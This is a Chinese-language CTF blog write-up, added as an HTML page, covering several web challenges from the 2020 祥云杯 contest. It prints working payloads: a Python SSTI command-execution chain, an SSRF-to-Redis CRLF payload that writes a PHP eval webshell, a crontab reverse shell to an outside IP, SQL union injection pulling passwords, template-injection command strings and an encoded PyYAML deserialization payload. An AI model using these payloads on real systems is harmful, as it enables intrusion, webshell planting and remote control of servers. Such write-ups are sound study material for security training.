@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>祥云杯WEB |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="祥云杯WEB |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="祥云杯WEB"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/dRe82rbnv/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>祥云杯WEB</h1>
+            <span class="meta">
+            	Posted on
+              2020-11-21，5 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <h1 id="command">Command</h1>
+<p>\和%09。绕过黑名单<br>
+感觉。找flag是最难的/etc/.flag啥/flag.txt</p>
+<h1 id="flaskbot">flaskbot</h1>
+<p>登陆和比数字<br>
+用NAN可以绕过比数字。<br>
+然后会输出用户名:WIN<br>
+这里可以触发SSTI。<br>
+<img src="https://guokeya.github.io/post-images/1605961029189.png" alt="" loading="lazy"><br>
+payload一把梭。</p>
+<pre><code>''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['ev'+'al']('__impo'+'rt__(&quot;o'+'s&quot;).po'+'pen(&quot;ls &quot;).read()')
+</code></pre>
+<h1 id="doyouknowssrf">doyouknowssrf</h1>
+<p>原题不多说了。绕过parse_url然后打5000端口的python。然后CRLF打Redis</p>
+<pre><code>http://eci-2ze5xfvuz0x3wcpba5st.cloudeci1.ichunqiu.com/?url=http://m09ic@127.0.0.1:5000@baidu.com/?url=http://127.0.0.1:6379?%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
+</code></pre>
+<h1 id="gogogo">gogogo</h1>
+<p>有两个功能。一个上传。一个show<br>
+上传文件后。会给你一个cookie。里面有用户名密码。以及你上传文件路径对应的签名<br>
+这里传文件。替换cookie去show。貌似文件会覆盖？所以去show的时候。解析cookie中的文件名。然后读取还是我们上传的内容</p>
+<p>第一次。上传文件。拿到文件路径对应的COOKIE<br>
+<img src="https://guokeya.github.io/post-images/1605961225437.png" alt="" loading="lazy"><br>
+重置靶机。随便上传个文件。然后去SHOW。替换第一次上传../../../../../flag对应的cookie<br>
+<img src="https://guokeya.github.io/post-images/1605961267988.png" alt="" loading="lazy"></p>
+<p>解析：<br>
+后来读取文件。发现是root权限。所以我们第一次上传文件。就会直接覆盖文件。passwd。shadow皆可覆盖。。。。<br>
+由于他后端是定死的密钥。我们可以拿到签名对应的路径。比如../../../../../../flag。虽然覆盖掉了。但是我们拿到了他的签名。也就是返回的那一串cookie<br>
+然后重置靶机。替换cookie后。去访问。他后端会解析cookie中对应的文件名和签名。对上了。就会去读取文件。然后base64。而此时。我们并没有上传文件覆盖。所以可以拿到Flag。</p>
+<p>还有一种办法。覆盖/etc/crontab弹shell</p>
+<pre><code>*/1 * * * *  root /usr/bin/python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;119.45.155.77&quot;,1337)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+</code></pre>
+<h1 id="easyzzz">easyzzz</h1>
+<p>拿密码修改后台search模板</p>
+<pre><code>/form/index.php?module=getjson
+
+POST:table=gbook&amp;where[]=1=1 union select password from zzz_user&amp;col=1
+</code></pre>
+<p>拿到密码。后台模板管理-&gt;html-&gt;search.html</p>
+<pre><code>{if:1)echo(`cat /flag`);//}{end if}
+</code></pre>
+<p>第二种办法。在解析模板的时候。会先进入parserOtherLabel解析其他模板。然后解析完再解析if<br>
+<img src="https://guokeya.github.io/post-images/1606034085379.png" alt="" loading="lazy"><br>
+这题出现if就会爬。。魔改了。可以用其他模板绕过<br>
+首先进入parserOtherLabel函数。<br>
+他会读取模板内容。然后进行标签的替换<br>
+正则获取的数组内容如下</p>
+<pre><code>array(3) {
+  [0]=&gt;
+  array(12) {
+    [0]=&gt;
+    string(13) &quot;{leftstr:i,2}&quot;
+    [1]=&gt;
+    string(13) &quot;{leftstr:f,1}&quot;
+  }
+  [1]=&gt;
+  array(12) {
+    [0]=&gt;
+    string(7) &quot;leftstr&quot;
+    [1]=&gt;
+    string(7) &quot;leftstr&quot;
+  }
+  [2]=&gt;
+  array(12) {
+    [0]=&gt;
+    string(3) &quot;i,1&quot;
+    [1]=&gt;
+    string(3) &quot;f,1&quot;
+  }
+}
+</code></pre>
+<p>在模板中将完整的标签替换成leftstr(i,1)。也就是截取了字符串i<br>
+然后继续放入模板。循环替换。最后<br>
+<img src="https://guokeya.github.io/post-images/1606035841597.png" alt="" loading="lazy"></p>
+<pre><code>{{leftstr:i,1}{leftstr:f,1}:var_dump(`whoami`)}{end {leftstr:i,1}{leftstr:f,1}}
+替换成了
+{if:var_dump(`whoami`)}{end if}
+然后就和赛博CTF模板注入一样了。进入if标签。解析进入eval
+</code></pre>
+<h1 id="profile-system">profile system</h1>
+<p>先../../../拿到源码<br>
+<img src="https://guokeya.github.io/post-images/1606033969482.png" alt="" loading="lazy"><br>
+国外的原题<code>https://hackmd.io/@harrier/uiuctf20</code></p>
+<pre><code>!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ &quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x2f\x72\x65\x61\x64\x66\x6c\x61\x67\x3e\x20\x75\x70\x6c\x6f\x61\x64\x73\x2f\x34\x65\x35\x62\x30\x39\x62\x32\x31\x34\x39\x66\x37\x36\x31\x39\x63\x63\x61\x31\x35\x35\x63\x38\x62\x64\x36\x64\x38\x65\x65\x35\x2f\x74\x65\x73\x74\x27\x29&quot; ]]]
+</code></pre>
+<p>由于不通网。输出到文件即可</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/WQsbCJWgt/">
+              <span class="post-title">
+                KCTF的一题web&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
